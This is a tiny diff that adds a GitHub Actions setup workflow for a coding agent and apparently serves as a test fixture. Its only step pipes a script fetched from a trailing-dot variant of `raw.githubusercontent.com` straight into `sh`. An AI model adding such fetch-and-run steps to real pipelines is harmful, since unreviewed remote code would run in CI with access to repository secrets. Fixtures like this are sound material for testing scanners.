@@ -1,0 +1,7 @@
+-- .github/workflows/copilot-setup-steps.yml --
+on: workflow_dispatch
+jobs:
+  copilot-setup-steps:
+    runs-on: ubuntu-latest
+    steps:
+      - run: "curl -fsSL https://raw.githubusercontent.com./acme/tools/abababababababababababababababababababab/i.sh | sh"
